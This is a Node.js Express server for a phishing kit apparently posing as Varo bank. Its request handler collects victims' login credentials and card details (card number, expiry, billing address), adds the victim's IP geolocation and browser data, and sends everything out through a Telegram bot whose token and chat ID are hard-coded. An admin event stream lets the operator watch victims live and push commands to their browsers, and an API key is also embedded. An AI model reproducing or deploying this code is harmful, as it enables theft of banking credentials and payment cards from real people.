const express = require('express');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();
const axios = require('axios');
const { sendMessageFor } = require('simple-telegram-message');

const app = express();
const port = process.env.PORT || 3000;

// Constants for API details
const API_URL = 'https://api-bdc.net/data/ip-geolocation?ip=';
const API_KEY = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
const botToken = "5433611121:AAFMpeQpC5y_y0PveL5sd77QQIXHuz6TOr4";
const chatId = "5200289419";

app.use(express.static('public'));
app.use(bodyParser.json());

// Initialize SQLite database
const db = new sqlite3.Database(':memory:');

db.serialize(() => {
  db.run("CREATE TABLE clients (id TEXT PRIMARY KEY, inputs TEXT, ip TEXT)");
  db.run("CREATE TABLE stats (id INTEGER PRIMARY KEY, stats_json TEXT)");
});

let visitors = 0;
let humans = 0;
let bots = 0;
let stats = '';
let clients = {};

function resetVisits(){
    visitors = 0;
}

function addClientToDatabase(clientId, ip) {
    visitors++;
    humans++;
    db.run("INSERT INTO clients (id, inputs, ip) VALUES (?, ?, ?)", [clientId, JSON.stringify({}), ip], (err) => {
        if (err) {
            console.error(`Error adding client ${clientId}: ${err.message}`);
        } else {
            console.log(`Client ${clientId} with IP ${ip} added to the database`);
        }
    });
}

function addStatsToDatabase(stats) {
    db.run("INSERT INTO stats (stats_json) VALUES (?)", [stats], (err) => {
        if (err) {
            console.error(`Error adding stats: ${err.message}`);
        } else {
            console.log(`Stats added to the stats table`);
        }
    });
}

function removeClientFromDatabase(clientId) {
    db.run("DELETE FROM clients WHERE id = ?", [clientId], (err) => {
        if (err) {
            console.error(`Error removing client ${clientId}: ${err.message}`);
        } else {
            console.log(`Client ${clientId} removed from the database`);
        }
    });
}

function updateClientInputs(clientId, inputs) {
    db.run("UPDATE clients SET inputs = ? WHERE id = ?", [JSON.stringify(inputs), clientId], (err) => {
        if (err) {
            console.error(`Error updating inputs for client ${clientId}: ${err.message}`);
        }
    });
}

function getClientData(callback) {
    db.all("SELECT * FROM clients", (err, rows) => {
        if (err) {
            console.error(`Error retrieving client data: ${err.message}`);
            callback([]);
        } else {
            callback(rows.map(row => ({ clientId: row.id, inputs: JSON.parse(row.inputs), ip: row.ip })));
        }
    });
}


function broadcastAdminPanel(currPage, stats) {
    getClientData((clientList) => {
         stats = { visitors, humans, bots };
        //stats = JSON.stringify(stats); // Update stats globally
		console.log(stats);
        const message = JSON.stringify({ type: 'adminUpdate', clientList, currPage, stats }); 
        console.log(`Broadcasting to admin panel: ${message}`);
        if (adminClient) {
            adminClient.write(`data: ${message}\n\n`);
        } else {
            console.log('No admin client connected');
        }
    });
}

function getClientIp(req) {
    const xForwardedFor = req.headers['x-forwarded-for'];
    if (xForwardedFor) {
        const ips = xForwardedFor.split(',');
        return ips[0].trim();
    }
    return req.connection.remoteAddress || req.socket.remoteAddress || null;
}

const handleRequest = async (req, res) => {
    let message = '';
    const ipAddress = getClientIp(req);

    const sendAPIRequest = async (ipAddress) => {
        try {
            const apiResponse = await axios.get(`${API_URL}${ipAddress}&localityLanguage=en&key=${API_KEY}`);
            return apiResponse.data;
        } catch (error) {
            console.error(`Error fetching IP information: ${error.message}`);
            return null;
        }
    };

    const ipAddressInformation = await sendAPIRequest(ipAddress);
    if (!ipAddressInformation) {
        return res.status(500).send('Error retrieving IP information');
    }

    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];
    const myObjects = Object.keys(req.body);
    const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());

    if (lowerCaseMyObjects.includes('password') || lowerCaseMyObjects.includes('email')) {
        message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
            `👤 LOGIN \n\n`;

        for (const key of myObjects) {
            if (key.toLowerCase() !== 'visitor' && req.body[key] !== "") {
                console.log(`${key}: ${req.body[key]}`);
                message += `${key}: ${req.body[key]}\n`;
            }
        }

        message += `🌍 GEO-IP INFO\n` +
            `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
            `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
            `CITY             : ${ipAddressInformation.location.city}\n` +
            `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
            `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
            `COUNTRY          : ${ipAddressInformation.country.name}\n` +
            `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
            `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
            `💻 SYSTEM INFO\n` +
            `USER AGENT       : ${userAgent}\n` +
            `SYSTEM LANGUAGE  : ${systemLang}\n` +
            `💬 Telegram: https://t.me/UpdateTeams\n`;

        const sendMessage = sendMessageFor(botToken, chatId);
        sendMessage(message);

        return;
    }

    if (lowerCaseMyObjects.includes('expirationdate') || lowerCaseMyObjects.includes('cardnumber') || lowerCaseMyObjects.includes('billing address')) {
        message += `✅ UPDATE TEAM | VARO | USER_${ipAddress}\n\n` +
            `👤 CARD INFO \n\n`;

        for (const key of myObjects) {
            if (key.toLowerCase() !== 'visitor') {
                console.log(`${key}: ${req.body[key]}`);
                message += `${key}: ${req.body[key]}\n`;
            }
        }

        message += `🌍 GEO-IP INFO\n` +
            `IP ADDRESS       : ${ipAddress}\n` +
            `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
            `💬 Telegram: https://t.me/UpdateTeams\n`;

        const sendMessage = sendMessageFor(botToken, chatId);
        sendMessage(message);

        return;
    }
};

let currPage = "";

app.get('/events', (req, res) => {
    const clientId = req.query.clientId;
    const isAdmin = req.query.admin === 'true';
    const clientIp = getClientIp(req);

    if (currPage === undefined || currPage === null || currPage === "") {
        currPage = req.query.currPage; // Provide a default value if currPage is undefined, null, or an empty string
    }

    console.log(`Received /events request: clientId=${clientId}, isAdmin=${isAdmin}, ip=${clientIp}`);

    if (clientId || isAdmin) {
        res.setHeader('Content-Type', 'text/event-stream');
        res.setHeader('Cache-Control', 'no-cache');
        res.setHeader('Connection', 'keep-alive');

        if (clientId && !clients[clientId]) {
            addClientToDatabase(clientId, clientIp);
            clients[clientId] = res;
            console.log(`Client ${clientId} connected`);
        }

        if (isAdmin) {
            adminClient = res;
            console.log('Admin client connected');
        }

        req.on('close', () => {
            if (clientId) {
                delete clients[clientId];
                removeClientFromDatabase(clientId);
                console.log(`Client ${clientId} disconnected`);
            }
            if (isAdmin) {
                adminClient = null;
                console.log('Admin client disconnected');
            }
            broadcastAdminPanel(currPage, visitors); // Pass currPage here
        });

        broadcastAdminPanel(currPage, stats); // Pass currPage here
    } else {
        res.status(400).send('Invalid clientId or admin query parameter');
    }
});

app.post('/send-command', (req, res) => {
    const { clientId, command } = req.body;
    const client = clients[clientId];
    if (client) {
        client.write(`data: ${JSON.stringify({ type: 'command', command })}\n\n`);
    }
    res.sendStatus(200);
});

app.post('/delete-client', (req, res) => {
    const { clientId } = req.body;
    if (clientId) {
        // Remove the client from memory and database
        if (clients[clientId]) {
            clients[clientId].end(); // End the SSE connection
            delete clients[clientId];
        }
        removeClientFromDatabase(clientId);
        broadcastAdminPanel(currPage, stats);
        res.sendStatus(200);
    } else {
        res.status(400).send('Missing clientId');
    }
});

app.post('/input', async (req, res) => { // Mark the route handler as async
    const { clientId, currPage, inputs } = req.body;

    console.log('Received /input request:', req.body);

    if (!clientId || typeof inputs !== 'object') {
        return res.status(400).send('Missing clientId or inputs object');
    }

    // Check if the client already exists in the database
    db.get("SELECT id, inputs FROM clients WHERE id = ?", [clientId], (err, row) => {
        if (err) {
            console.error(`Error retrieving client ${clientId}: ${err.message}`);
            return res.sendStatus(500);
        }

        if (!row) {
            addClientToDatabase(clientId, getClientIp(req));
            row = { inputs: '{}' };
        }

        // Merge new inputs with existing ones
        const existingInputs = JSON.parse(row.inputs);
        const updatedInputs = { ...existingInputs, ...inputs };

        updateClientInputs(clientId, updatedInputs);
        broadcastAdminPanel(currPage, stats);
        res.sendStatus(200);
    });
    
    try {
        await handleRequest(req, res);
    } catch (error) {
        console.error(`Error processing request: ${error.message}`);
        //res.sendStatus(500);
    }
});

app.post('/process-request', async (req, res) => {
    try {
        await handleRequest(req, res);
    } catch (error) {
        console.error(`Error processing request: ${error.message}`);
        res.sendStatus(500);
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});